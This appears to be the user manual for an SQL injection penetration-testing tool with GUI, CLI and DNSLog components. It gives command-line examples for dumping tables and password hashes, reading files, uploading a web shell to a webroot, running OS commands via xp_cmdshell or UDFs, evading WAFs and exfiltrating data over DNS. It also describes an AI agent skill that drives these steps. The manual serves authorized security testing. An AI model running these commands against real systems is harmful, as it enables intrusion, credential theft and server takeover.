# 超级SQL注入工具 V2 · 使用手册

版本：V2.0.0
适用形态：图形界面（SuperSQLInjectionV2.Desktop）/ 命令行（SuperSQLInjectionV2.Cmd）/ DNSLog 接收服务（SuperSQLInjectionV2.DnsServer）

> **免责声明**：本工具仅限授权范围内的安全测试与学习研究使用，请勿用于非法用途。使用本工具产生的一切后果由使用者自行承担。

---

## 目录

- [第 1 章 软件简介](#第-1-章-软件简介)
- [第 2 章 安装与运行](#第-2-章-安装与运行)
- [第 3 章 快速上手（五分钟跑通一次注入）](#第-3-章-快速上手五分钟跑通一次注入)
- [第 4 章 注入检测](#第-4-章-注入检测)
- [第 5 章 注入记录](#第-5-章-注入记录)
- [第 6 章 数据管理（取数与利用）](#第-6-章-数据管理取数与利用)
- [第 7 章 网络设置](#第-7-章-网络设置)
- [第 8 章 防护绕过](#第-8-章-防护绕过)
- [第 9 章 工具页（取数模版 / 编码工具 / 请求日志）](#第-9-章-工具页取数模版--编码工具--请求日志)
- [第 10 章 命令行 SuperSQLInjectionV2.Cmd 完整参考](#第-10-章-命令行-SuperSQLInjectionV2.Cmd-完整参考)
- [第 11 章 DNS 外带与 DnsServer 部署](#第-11-章-dns-外带与-dnsserver-部署)
- [第 12 章 软件更新与问题反馈](#第-12-章-软件更新与问题反馈)
- [第 13 章 AI 智能体集成（supersqlinjectionv2-cmd skill）](#第-13-章-ai-智能体集成supersqlinjectionv2-cmd-skill)
- [第 14 章 常见问题 FAQ](#第-14-章-常见问题-faq)

---

## 第 1 章 软件简介

### 1.1 定位

超级SQL注入工具V2 是一款**图形化 SQL 注入测试工具**，基于 Avalonia 跨平台运行（Windows / macOS / Linux），是 SuperSQLInjection V1（Windows 专用）的跨平台升级版本。配套命令行版本 **SuperSQLInjectionV2.Cmd**（Native AOT 单文件，无需 .NET 运行时）支持脚本化、批量化的注入检测与数据利用。

### 1.2 核心能力

| 能力域 | 说明 |
| --- | --- |
| 注入检测 | Bool 盲注 / 报错注入 / Union 注入 / 时间盲注 / 堆叠注入 / DNS 外带；Level 1–5 与 Risk 1–3 分级用例；网页相似度抗噪、智能模式、穷举模式 |
| 数据获取 | 环境变量、库 / 表 / 列结构枚举、行数据 dump（分片 / 断点续传 / 中文识别）、自定义 SQL、Hash 读取、权限角色 |
| 文件与命令 | 各数据库读文件 / 写文件（含 MySQL UDF 写库）、命令执行（MySQL UDF sys_eval、SQLServer xp_cmdshell、PostgreSQL UDF 等多通道） |
| 防护绕过 | 内置编码工具链 + 自定义 JS（QuickJS）tamper 脚本、字符替换（支持正则 / 编码前处理）、Chunked 分块、HPP 参数污染、随机 UA / UA 池、代理池轮换、固定延时 / 限速 |
| 智能加速 | 在线学习 / 值预测、n-gram 字符预测、值缓存，盲注取数速度显著提升 |
| 支持数据库 | MySQL、SQLServer、PostgreSQL、SQLite、Oracle、Access、DB2、Informix、达梦、人大金仓、openGauss、ClickHouse、H2、HSQLDB（取数语句为独立模板，可扩展） |

### 1.3 运行形态

| 程序 | 形态 | 用途 |
| --- | --- | --- |
| SuperSQLInjectionV2.Desktop | Avalonia 桌面 GUI | 交互式检测、取数、利用，全部功能入口 |
| SuperSQLInjectionV2.Cmd | 命令行（Native AOT 单文件） | 脚本化批量检测与取数，无界面、易集成 |
| SuperSQLInjectionV2.DnsServer | 独立控制台服务 | 部署到公网 VPS 的自建 DNSLog 接收端，配合 DNS 外带注入 |

GUI 与 CLI 共用同一套核心引擎与 `config/` 配置目录（取数模板、检测用例、字典、报错指纹），检测结论与取数行为完全一致。

> 从 V1 升级的用户请阅读《SuperSQLInjectionV2 V2 更新说明.md》，了解 V2 相对 V1 的新增与优化项。

---

## 第 2 章 安装与运行

### 2.1 图形界面（Desktop）

- **Windows**：运行 `SuperSQLInjectionV2.Desktop.exe`。
- **macOS / Linux**：从源码发布或运行 `publish-release.sh` 产物；开发调试可在仓库根目录执行：

```bash
dotnet run --project SuperSQLInjectionV2.Desktop
```

- 首次运行后，程序会在运行目录下使用 `config/` 配置目录（取数模板、检测用例、字典等），**请勿删除该目录**。
- 界面支持明暗双主题，在标题栏右侧切换；窗口大小、主题等偏好自动记忆。

### 2.2 命令行（SuperSQLInjectionV2.Cmd）

SuperSQLInjectionV2.Cmd 为 Native AOT 单文件，无需安装 .NET 运行时。仓库提供三平台发布脚本：

| 平台 | 发布脚本 | 产物 |
| --- | --- | --- |
| Windows x64 | `publish-cli-aot.cmd` | `SuperSQLInjectionV2.Cmd.exe` |
| Linux x64 | `publish-cli-aot-linux.sh` | `SuperSQLInjectionV2.Cmd`（需 `chmod +x`） |
| macOS arm64 | `publish-cli-aot-osx.sh` | `SuperSQLInjectionV2.Cmd` |

运行要求：

1. 二进制同目录必须保留 `config/` 目录（取数模板 / 检测用例 / 字典），目录结构不可破坏；
2. 以二进制所在目录为工作目录执行；
3. 默认输出写入 `output/<host>_<port>/`（可用 `--output-dir` 修改）。

验证安装：

```bash
SuperSQLInjectionV2.Cmd --version
SuperSQLInjectionV2.Cmd --help
```

### 2.3 DNSLog 接收服务（DnsServer）

需部署到具有公网 IP 的 VPS，详见 [第 11 章](#第-11-章-dns-外带与-dnsserver-部署)。

---

## 第 3 章 快速上手（五分钟跑通一次注入）

以本地靶场 `http://127.0.0.1:8090/JVApp/mysql.jsp?id=1`（MySQL 注入点）为例：

### 3.1 GUI 流程

1. **打开「注入检测」页**，在请求编辑区填入目标 URL（或粘贴完整 HTTP 报文）。
2. 在参数 `id=1` 的 `1` 上**插入注入标记**（选中后点"注入标记"按钮），或直接让工具自动识别参数。
3. 点击**开始检测**。检测日志实时滚动，检测概览面板同步显示进度。
4. 检测命中后，状态栏显示"存在注入"，并自动标注**注入点位置、注入类型、数据库类型**；该条结果进入「注入记录」页。
5. 切换到「注入记录」页，选中该记录 → 点击**取数**（或"恢复到当前配置"），自动跳转到「数据管理」页并带出该注入点的全部通道配置（含时间盲注的时间值）。
6. 在「数据管理」页按需操作：
   - **环境变量**：一键读取版本、当前用户、当前库、主机名、是否 DBA 等；
   - **数据操作**：获取库 → 获取表 → 获取列 → 获取数据（树形浏览，双击节点逐级展开）；
   - 需要时切到 **Hash 读取 / 权限角色 / 读取文件 / 命令执行 / 自定义 SQL** 选项卡执行对应动作。

### 3.2 CLI 流程

```bash
# 一步完成检测 + 枚举所有数据库
SuperSQLInjectionV2.Cmd -u "http://127.0.0.1:8090/JVApp/mysql.jsp?id=1" --dbs

# 指定库表拖数据
SuperSQLInjectionV2.Cmd -u "http://127.0.0.1:8090/JVApp/mysql.jsp?id=1" -D sqli_test -T users --dump
```

CLI 检出注入后自动复用注入点拼接对应数据库的取数 SQL，无需手工指定注入类型。

---

## 第 4 章 注入检测

### 4.1 检测类型（--technique=BEUTSD）

| 字母 | 类型 | 原理 | 特点 |
| --- | --- | --- | --- |
| B | Bool 盲注 | 真 / 假条件页面差异（关键字 / 相似度 / 比值三种比对） | 通用性最强，速度较慢 |
| E | 报错注入 | 触发数据库报错并回显数据（xpath / updatexml / floor 等） | 回显快，依赖报错开启 |
| U | Union 注入 | 联合查询直接回显 | 最快，要求列数与类型匹配 |
| T | 时间盲注 | sleep / benchmark 类延时判断 | 最慢但最隐蔽，抗干扰配置多 |
| S | 堆叠注入 | 多语句执行 | 依赖驱动支持（如 SQLServer、PostgreSQL） |
| D | DNS 外带 | 数据经 DNS 解析带出（load_file / xp_dirtree 等） | 绕过无回显 + 出网受限场景 |

### 4.2 Level 与 Risk

- **Level（1–5，默认 1）**：检测用例的覆盖广度。级别越高，尝试的闭合方式（括号层数、引号类型）、注入位置（GET/POST/Cookie/UA/Referer 等头部）越多，请求量越大。
- **Risk（1–3，默认 1）**：用例的风险等级。级别越高，包含越"重"的 payload（如 OR 条件、时间类、堆叠类），对目标影响越大。

建议策略：先默认 Level 1 / Risk 1 快速过一遍；未检出再升 Level 2–3；仍无结果且确认存在注入时，配合 `--dbms` 收窄数据库类型 + `--exhaustive` 穷举。

### 4.3 检测模式

- **智能模式（--smart）**：先跑高命中率用例与启发式判断（报错指纹扫描、单双引号扰动），命中即深测，大幅缩减请求量。
- **穷举模式（--exhaustive）**：不剪枝，跑完当前 Level/Risk 下全部用例，适合收尾确认。
- **网页相似度抗噪**：对每次响应计算与基准页面的相似度，自动识别"软 404"、WAF 拦截页、动态噪声（广告位、时间戳），Bool 盲注判断以相似度为主、关键字为辅，显著降低误报。
- **报错指纹库**：报错注入识别基于独立维护的指纹库 `config/injection/errors.xml`（兼容 sqlmap errors.xml 结构），在「检测用例」页的**报错指纹**选项卡中可视化管理（分页浏览 / 新增 / 编辑 / 删除），可按数据库类型归类。

### 4.4 检测用例管理

「检测用例」页管理全部检测 payload（按数据库 × 注入类型 × Level/Risk 组织）：

- 支持查看 / 新增 / 编辑 / 删除用例，修改即时生效；
- 报错指纹独立分页管理，与用例分离；
- 用例文件位于 `config/injection/` 目录，可直接备份或迁移。

### 4.5 检测预览与日志

- **检测概览**：实时显示当前测试的注入类型、数据库、已发请求数、命中状态；
- **检测日志**：完整记录每次请求 / 响应（可在请求日志页回放）；
- 检测到时间盲注时，记录中同时保存**实测延时值**，恢复记录后自动带出到数据管理的时间盲注通道配置。

---

## 第 5 章 注入记录

检测命中的注入点自动入库（不丢），「注入记录」页以表格形式持久展示：

- **字段**：URL、注入参数、注入类型（标签）、数据库类型、检测时间等；
- **搜索工具栏**：按 URL / 参数 / 注入类型 / 数据库类型等条件组合过滤；
- **操作**：
  - **查看**：回放该记录的检测详情；
  - **取数 / 恢复配置**：一键把该注入点恢复到当前配置（请求、注入标记、注入类型、数据库、时间值等全部带出），跳转数据管理直接利用；
  - **删除**：删除选中记录。

多目标批量检测后，可在记录页挑选任意注入点随时切换利用对象。

---

## 第 6 章 数据管理（取数与利用）

「数据管理」是利用主页面，顶部为**注入配置区**（左右布局：左侧两行配置——检测记录选择 / 目标 URL / 端口 / SSL / 线程，以及值预测、在线学习、值缓存、通道升级等取数增效开关与读取方式 / 编码；右侧为通高的"应用"按钮，默认由注入记录带出配置，手动调整后点"应用"覆盖取数链路），下方为选项卡工作区，默认选中**请求配置**。

### 6.1 请求配置

- **请求编辑区**：完整 HTTP 报文编辑，支持插入**注入标记**（指定注入点）、**插入动态值**（取数占位符）、**编码标记**（指定编码方式）；
- **通道配置**（GroupBox 分区）：
  - **基础**：请求方式、超时、重试、编码、SSL、线程数量（顶部）、跟随 302；
  - **Union**：列数、回显位、前置闭合等 Union 通道参数；
  - **报错**：报错通道的回显提取规则；
  - **Bool 盲注**：真 / 假判断的关键字、相似度阈值、比值阈值；
  - **时间盲注**：延时秒数、判定阈值（由注入记录自动带出实测值）；
  - **查找判断值 / 验证值**：页面特征定位与二次验证，置于卡片底部；
- **动态规则**（防护绕过页"动态规则"选项卡，动态值与二次注入统一为规则管理；原"伴随请求"）：以 **TableView 规则列表**管理全部动态规则（启用开关 / 名称 / **标记名** / 类型 / 来源 / 取值方式 / 摘要一目了然），点"新增规则"或双击列表行，在**编辑弹窗**中完成配置（弹窗内请求报文带 HTTP 语法高亮）；规则类型分**动态值**与**二次注入**两类：**动态值可多条同时启用**，**二次注入同时只能启用一条**（开启一条自动关闭其余）；也可通过**标记名**精确关联：
  - **标记名与规则开关（多规则场景）**：每条规则可设置唯一**标记名**（留空自动补默认值：动态值 `token` / 二次注入 `sencond`）。注入检测页与数据管理页的请求报文**右键菜单"插入动态值"**列出全部动态值规则（无选中态，数据管理工具栏"动态值"按钮同源），**点击规则即启用它并在报文中插入 `<DRule>` 标记**：有选区时插入 `<DRule>标记名:选区数据<DRule>`（选区数据保留作占位值，发送时整块被动态值替换），无选区时在光标处插入 `<DRule>标记名<DRule>`；规则的启停统一在 防护绕过-动态规则 页管理（动态值可多条同时启用）。右键菜单**"二次注入（单选）"**以单选按钮列出全部二次注入规则，**选中一条启用并自动关闭其余**，并含"关闭二次注入"项一键全部停用。不带标记名的 `<DRule><DRule>` 关联**第一条启用的动态值规则**，多条动态值规则并存时通过标记名精确指定由哪条规则取值；二次注入同理可写 `<Sencond:标记名></Sencond>` 指令（仅用于指定规则，发送前自动从报文剔除）；命名标记找不到对应启用规则时会在日志中提示并跳过，不会误用其他规则；
  - **动态值（回填 `<DRule>` 标记）**：主请求发出前取得动态值并回填主请求的 `<DRule>` 标记（CSRF token / 防重放 / API 签名场景）。取值来源三种：**直接粘贴请求报文**抓取、**URL + 请求方式（GET/POST）**抓取、**脚本生成**（不发抓取请求，脚本输入为主请求报文，输出动态值，可对报文做签名，适用于 API 接口）；从响应中提取时支持**字符串截取**（开始 / 结束字符）或**脚本提取**（脚本输入为完整 HTTP 响应报文：头 + body）。脚本按用途分**请求抓取 / 自主生成**两类型，规则弹窗按来源自动过滤可选脚本，并可点"添加脚本"按钮现场新建；脚本统一在本页"脚本管理"子选项卡维护。弹窗内置"测试抓取动态值"：按当前编辑内容实际执行并展示取值结果，保存前即可验证；
  - **后置 · 二次注入取数（响应替代主响应）**：配置**回显页面的完整 HTTP 请求包**（或 URL + 请求方式）并启用；之后每次注入请求发出后，工具自动追加请求该回显页面，并**用回显页面的响应替代原响应**进入后续解析（Union 回显提取、报错提取、Bool 判断、数据读取全部透明生效）。适用于注入点与数据显示分离的场景（如注入在写入接口、数据在查询接口）。回显页面请求中的 `<Rand>` 标记会与刚发出的注入请求**按请求流自动配对（FlowRand）**，多线程下各请求流独立配对、不会交错错配，**无需限制单线程**（多线程取数全速可用）；
- **代理 / 认证 / 重发**等网络相关见第 7 章。

### 6.2 环境变量

一键读取数据库环境信息：版本（banner）、当前用户、当前库、主机名、是否 DBA、系统变量等。按数据库类型自动选择对应 SQL（如 MySQL `@@version`、SQLServer `@@version`、Oracle `v$version`）。

### 6.3 数据操作（库 / 表 / 列 / 行）

树形逐级枚举：

1. **获取库**：枚举全部数据库（自动跳过系统库可配）；
2. **获取表**：选中库后枚举表；
3. **获取列**：选中表后枚举列与类型；
4. **获取数据**：选中表 / 列后 dump 行数据，支持：
   - **分片读取**（LIMIT 分页，大表不卡死）；
   - **断点续传**（中断后从上次行号继续）；
   - **中文识别**（hex / 编码自动处理，避免乱码）；
   - 行数范围（start / stop）与 WHERE 条件过滤；
   - 结果导出。

盲注通道下枚举同样可用，配合多线程 + 智能预测（n-gram 字符预测、值缓存）显著提速；树节点随命中实时增量更新。

### 6.4 Hash 读取

读取数据库账户口令散列（如 MySQL `mysql.user`、SQLServer `sys.sql_logins`、Oracle `sys.user$`），按数据库类型自动选择语句与通道。

### 6.5 权限角色

枚举当前用户及全部用户的权限 / 角色（如 MySQL `information_schema.user_privileges`、SQLServer `sys.server_principals`、Oracle `dba_roles`）。

### 6.6 读取文件

按数据库类型自动选择文件读取通道（MySQL `load_file`、SQLServer `OPENROWSET/BULK`、PostgreSQL `pg_read_file`、Oracle `UTL_FILE` 等），输入远程路径即可读取内容。操作方式通过下拉框选择通道，结果显示支持从首行展示、复制与导出。

### 6.7 写文件

- 常规写文件：MySQL `INTO OUTFILE/DUMPFILE`、SQLServer `xp_cmdshell` 回写、PostgreSQL `COPY` 等；
- **MySQL UDF 写库**：内置 lib_mysqludf_sys 二进制，通过 Union 写入 plugin 目录后 `CREATE FUNCTION sys_eval`，为命令执行铺路。

### 6.8 命令执行

按数据库类型自动选择执行通道：

| 数据库 | 通道 |
| --- | --- |
| MySQL | UDF（sys_eval / sys_exec，内置二进制自动写库建函数） |
| SQLServer | xp_cmdshell（自动开启组件）、OLE、CLR 等 |
| PostgreSQL | UDF（lib_postgresqludf_sys）、COPY FROM PROGRAM 等 |
| Oracle | Java 存储过程 / DBMS_SCHEDULER 等 |
| 达梦 | 兼容 Oracle 通道 |

输出逐字符实时回显；自动剥离通道产生的多余换行。

### 6.9 自定义 SQL

直接输入任意 SQL，工具按当前注入点与数据库类型自动拼接到可用通道执行并回显结果（多行结果表格化展示）。

---

## 第 7 章 网络设置

| 选项卡 | 说明 |
| --- | --- |
| 基础配置 | 请求设置：超时时间、超时重试、跟踪 302、**随机源 IP**（伪造 X-Forwarded-For / X-Real-IP / Client-IP 头）、连接池、网页自动解码 / 指定解码；配置导出 / 导入 |
| HTTP 认证 | Basic / Digest / NTLM 三种认证配置 |
| 代理设置 | 单代理（HTTP / SOCKS5）与**代理池**（批量导入、可用性验证、失败自动轮换） |
| DNSLog | DNSLog 类型选择：公共平台（ceye 等，填 API 模板与 token）/ 自建 DnsServer / **本机内置接收**（监听 53 或高位端口，无需 VPS 即可收 DNS 外带） |
| UA 池 | User-Agent 池管理，配合随机 UA 轮换 |
| 字典管理 | 盲注字典（库名 / 表名 / 列名猜解字典）维护，命中即实时上树 |
| 重发设置 | 请求失败重发策略（次数、间隔、条件） |

---

## 第 8 章 防护绕过

| 选项卡 | 说明 |
| --- | --- |
| 频率与指纹 | 固定延时、随机延时、限速、随机 UA（指纹混淆）、随机源 IP（伪造 X-Forwarded-For / X-Real-IP / Client-IP 头，绕过基于 IP 的访问控制与频率限制） |
| 字符替换 | payload 级字符串替换规则，支持正则与"编码前处理"，等价于 sqlmap 的替换类 tamper |
| 编码处理 | **内置编码工具链**（C# 实现：URL 双重编码、大小写随机、注释混淆、空格变异、十六进制等，可多选链式组合）+ **自定义 JS 脚本**（QuickJS 引擎，实现 `function tamper(payload)` 接口即可，脚本可视化管理） |
| 动态规则 | 动态值与二次注入统一规则管理（原"伴随请求"，内嵌"动态规则 / 脚本管理"两个子选项卡）：动态值规则从 HTTP 响应抓取或脚本生成动态值回填 `<DRule>` 标记（CSRF token / 防重放 / API 签名），可多条同时启用；二次注入规则以回显页响应替代主响应取数，同时只能启用一条；脚本管理子选项卡维护全部动态值脚本（分**请求抓取 / 自主生成**两类型） |
| Chunked / HPP | HTTP 分块传输编码（随机大小多块，切点可落在 SQL 关键字中间）与参数污染开关（覆盖 Query 与 body 参数位，自动修正 Content-Length）、参数名大小写混淆（注入参数名每请求随机大小写，绕过参数级 WAF） |

自定义 JS tamper 示例：

```javascript
function tamper(payload) {
    return payload.replace(/ /g, '/**/');
}
```

---

## 第 9 章 工具页（取数模版 / 编码工具 / 请求日志）

### 9.1 取数模版

各数据库 × 各注入类型的取数 SQL 模板（版本、库表列、文件、命令等）可视化查看与维护。模板文件位于 `config/` 目录，熟悉 SQL 注入语句的用户可直接扩展新数据库或定制语句。模板的命名占位符说明与完整词汇表收在工具栏右侧**问号图标**的悬停提示中（`{expr}`、`{cols}`、`{db}`、`{table}` 等槽位含义一览），不再占用页面空间。

### 9.2 编码工具

独立的编码 / 解码小工具：URL、Base64、Hex、HTML 实体、Unicode、MD5 等常用变换，便于手工分析 payload 与回显。

### 9.3 请求日志

全部 HTTP 请求 / 响应留痕，支持按时间 / 目标过滤、查看完整报文、回放单条请求，是排查"检测为什么没中"的第一入口。

---

## 第 10 章 命令行 SuperSQLInjectionV2.Cmd 完整参考

### 10.1 参数总表

**目标**

| 参数 | 说明 |
| --- | --- |
| `-u URL` | 目标 URL |
| `-r FILE` | 从文件加载原始 HTTP 报文（复杂头 / Cookie / JSON / XML 注入点必选） |
| `--data=DATA` | POST 数据 |
| `--cookie=COOKIE` | Cookie 头 |
| `--header=HEADER` | 自定义请求头（可多次指定） |
| `--method=METHOD` | 强制 HTTP 方法 |
| `-p PARAM` | 指定测试参数（默认全部可注入参数） |

**检测**

| 参数 | 说明 |
| --- | --- |
| `--level=1-5` | 检测级别（默认 1） |
| `--risk=1-3` | 风险级别（默认 1） |
| `--technique=BEUTSD` | 指定检测技术组合（B布尔 E报错 U联合 T时间 S堆叠 D DNS外带） |
| `--dbms=DBMS` | 指定数据库类型收窄检测（mysql / mssql / pgsql / sqlite / oracle / access / db2 / dameng） |
| `--smart` | 智能模式（高命中用例优先 + 启发式判断） |
| `--exhaustive` | 穷举模式（不剪枝跑完全部用例） |
| `--dns-domain=DOMAIN` | DNS 外带域名（配合 `--technique=D`） |
| `--dns-token=TOKEN` | DNSLog 平台 token |

**请求**

| 参数 | 说明 |
| --- | --- |
| `--proxy=PROXY` | 代理（http:// / socks5://） |
| `--timeout=秒` | 超时时间（默认 15） |
| `--retries=次数` | 失败重试（默认 1） |
| `--delay=毫秒` | 请求间隔延时 |
| `--threads=N` | 盲注多线程 |
| `--random-agent` | 随机 User-Agent |
| `--user-agent=UA` | 指定 User-Agent |
| `--tamper=A,B` | 启用 tamper 脚本（内置编码工具链，逗号分隔链式组合） |
| `--follow-redirects` | 跟随 302 跳转 |

**取数动作**

| 参数 | 说明 |
| --- | --- |
| `--banner` | 数据库版本 |
| `--current-user` / `--current-db` / `--hostname` / `--is-dba` | 当前用户 / 当前库 / 主机名 / 是否 DBA |
| `--env` | 全部环境变量 |
| `--passwords` | 读取账户 Hash |
| `--privileges` | 枚举权限角色 |
| `--dbs` | 枚举全部数据库 |
| `--tables` | 枚举表（配合 `-D`） |
| `--columns` | 枚举列（配合 `-D -T`） |
| `--dump` | 导出表数据（配合 `-D -T [-C]`） |
| `-D DB` / `-T TABLE` / `-C COLS` | 指定库 / 表 / 列 |
| `--start=N` / `--stop=N` | 行范围 |
| `--where=COND` | WHERE 过滤条件 |
| `--sql-query=SQL` | 执行自定义 SQL |
| `--file-read=PATH` | 读取远程文件 |
| `--file-write=FILE` + `--file-dest=PATH` | 上传本地文件到远程路径 |
| `--os-cmd=CMD` | 执行操作系统命令（自动按数据库类型选择 UDF / xp_cmdshell 等通道） |
| `--no-cast` | 关闭类型转换 |
| `--hex` | 中文等非 ASCII 数据按 hex 读取（防乱码） |

**输出**

| 参数 | 说明 |
| --- | --- |
| `--output-dir=DIR` | 输出目录（默认 `output/<host>_<port>/`） |
| `--batch` | 非交互模式（默认即非交互，全部取默认答案） |
| `--version` | 显示版本 |
| `-h` / `--help` | 显示帮助 |

> 注：`--os-shell` 目前为保留参数，暂不支持。

### 10.2 典型示例

```bash
# 基础检测
SuperSQLInjectionV2.Cmd -u "http://127.0.0.1:8090/JVApp/mysql.jsp?id=1"

# 提高检测级别 + 指定数据库
SuperSQLInjectionV2.Cmd -u "http://target/list.php?id=1" --level 3 --risk 2 --dbms mysql

# 原始报文 + 指定注入参数（JSON/Cookie 注入）
SuperSQLInjectionV2.Cmd -r req.txt -p token

# 检测 + 环境信息
SuperSQLInjectionV2.Cmd -u "http://target/a.php?id=1" --banner --current-user --current-db --is-dba

# 逐级枚举
SuperSQLInjectionV2.Cmd -u "..." --dbs
SuperSQLInjectionV2.Cmd -u "..." -D cms --tables
SuperSQLInjectionV2.Cmd -u "..." -D cms -T admin --columns
SuperSQLInjectionV2.Cmd -u "..." -D cms -T admin -C "username,password" --dump

# 大表分片 + 条件过滤 + 防中文乱码
SuperSQLInjectionV2.Cmd -u "..." -D cms -T users --dump --start 1 --stop 500 --where "id>100" --hex

# 自定义 SQL
SuperSQLInjectionV2.Cmd -u "..." --sql-query="select user,host from mysql.user"

# Hash / 权限
SuperSQLInjectionV2.Cmd -u "..." --passwords --privileges

# 文件与命令
SuperSQLInjectionV2.Cmd -u "..." --file-read="C:\\windows\\win.ini"
SuperSQLInjectionV2.Cmd -u "..." --file-write=./shell.php --file-dest="C:\\inetpub\\wwwroot\\s.php"
SuperSQLInjectionV2.Cmd -u "..." --os-cmd="whoami"

# WAF 绕过组合
SuperSQLInjectionV2.Cmd -u "..." --tamper=space2comment,randomcase --random-agent --delay 300

# DNS 外带
SuperSQLInjectionV2.Cmd -u "..." --technique=D --dns-domain=dns.example.com --dbs

# 盲注提速
SuperSQLInjectionV2.Cmd -u "..." --threads 5 --dbs
```

### 10.3 结果与输出

- 检测结束后在终端打印结果摘要（注入点、类型、数据库、payload）；
- 会话落盘 `session.json`（输出目录内），dump 数据同时打印 ASCII 表格并保存 **CSV**；
- 文件读取 / 命令执行结果直接打印并写入输出目录。

---

## 第 11 章 DNS 外带与 DnsServer 部署

### 11.1 什么时候需要 DNS 外带

目标页面完全无回显、且时间盲注过慢或被干扰时，DNS 外带通过数据库发起 DNS 解析（MySQL `LOAD_FILE`、SQLServer `xp_dirtree`、Oracle `UTL_INADDR` 等）把数据编码进子域名带出，只需目标能出网解析 DNS 即可。

### 11.2 三种接收方式（GUI「网络设置 - DNSLog」）

1. **公共平台**：ceye 等在线 DNSLog，填 API 地址模板与 token；
2. **自建 DnsServer**：部署到自己的 VPS（见下），域名 NS 指向 VPS；
3. **本机内置接收**：无需 VPS，主程序直接在本机监听 53（或高位端口）接收解析请求，适合内网 / 靶场。

### 11.3 DnsServer 部署

```bash
SuperSQLInjectionV2.DnsServer --domain dns.example.com --port 53 --http 8080 --token SECRET [--answer 127.0.0.1]
```

| 参数 | 说明 |
| --- | --- |
| `--domain` | 权威区名（必填，如 `dns.example.com`），其 NS 记录指向 VPS |
| `--port` | DNS 监听端口（默认 53；Linux 需 root 或 `setcap 'cap_net_bind_service=+ep'`） |
| `--http` | HTTP 查询 API 端口（默认 8080） |
| `--token` | API 访问密钥（为空则不校验，仅限内网 / 防火墙场景） |
| `--answer` | DNS 应答 IP（默认 127.0.0.1） |

HTTP API（ceye 兼容格式，主程序直接复用回收链路）：

```
GET /api/records?token=<token>&type=dns&filter=<domain>   # 查询记录
GET /api/clear?token=<token>                              # 清空记录
GET /healthz                                              # 健康检查
```

部署后主程序侧配置：

- **DNSLog 域名**：`dns.example.com`
- **DNSLog API 地址模板**：`http://<vps>:8080/api/records?token={token}&type=dns&filter={domain}`

> Windows 下非管理员绑定通配前缀会回退为仅本机监听；需外部访问请以管理员运行，或先执行 `netsh http add urlacl url=http://+:<port>/ user=Everyone`。

---

## 第 12 章 软件更新与问题反馈

「关于」页提供三张卡片：

- **软件介绍**：版本、核心能力与免责声明；
- **软件更新**：更新服务连接配置（服务地址 / 应用标识 / 渠道 / 客户端Key）写在 `config/update.ini` 中随软件分发（UI 不提供修改，改后重启生效，文件缺失时自动按默认值重建）；卡片内勾选"自动检测"后启动时后台检测新版本，点击"检查更新"手动查询，检测到新版本后可下载更新包（zip）到软件运行目录，**关闭软件后解压覆盖**即可完成升级；
- **问题反馈**：在线提交问题 / 建议（POST `/api/client/feedback`，自动附带当前版本号），可留联系方式便于回访；依赖 `config/update.ini` 中的服务地址可达，服务不可达不影响软件正常使用。

---

## 第 13 章 AI 智能体集成（supersqlinjectionv2-cmd skill）

仓库内置 `skills/supersqlinjectionv2-cmd/` 智能体技能包，可被 Kimi Work 等 AI 智能体直接加载，用自然语言驱动 SuperSQLInjectionV2.Cmd 完成授权测试：

- skill 内置 Windows / Linux 预编译二进制（`assets/bin/`），macOS 见目录内说明；
- 智能体按 skill 约定的工作流自动执行：检测 → 复用注入点取数（环境 / 库表列 / dump / Hash / 权限）→ 文件与命令 → 回收 CSV 结果并汇报绝对路径；
- 适用前提与手工使用一致：**目标必须在授权范围内**（本地靶场、自有系统、授权渗透）。

---

## 第 14 章 常见问题 FAQ

**Q1：检测不到注入，但手工确认存在？**
按顺序排查：① 确认注入标记位置正确；② 升到 Level 2–3；③ 用 `--dbms` 收窄数据库类型 + 穷举模式；④ 看「请求日志」响应是否被 WAF 拦截，是则配置编码处理 / 字符替换 / 随机 UA / 延时；⑤ 页面噪声大时确认 Bool 盲注走相似度判断（默认开启）。

**Q2：盲注太慢？**
① 确认非 WAF 限速；② 提高线程数；③ 用报错 / Union / DNS 外带替代（检测时多类型命中可任选通道）；④ 智能预测（n-gram 字符预测、值缓存）默认已开启。

**Q3：dump 中文乱码？**
勾选中文识别（CLI 加 `--hex`），数据按 hex 取出后本地解码。

**Q4：命令执行结果带多余空行？**
已做通道输出净化（剥离 UDF / xp_cmdshell 产生的前导换行），若仍有个别残留，属目标环境回显差异，不影响内容。

**Q5：时间盲注误判 / 漏判？**
网络抖动大时，把判定阈值调高（通道配置 - 时间盲注）；由注入记录恢复的配置会自动带出检测时的实测延时值，一般无需手调。

**Q6：config 目录被删 / 损坏？**
取数模板、检测用例、字典均从 `config/` 加载，删除后功能不可用；从发布包重新拷贝该目录即可恢复。

**Q7：GUI 和 CLI 结论不一致？**
两者共用引擎与配置，正常应一致；检查 CLI 工作目录是否为二进制所在目录、`config/` 是否齐全。

---

*手册结束 · 超级SQL注入工具V2（V2.0.0）*
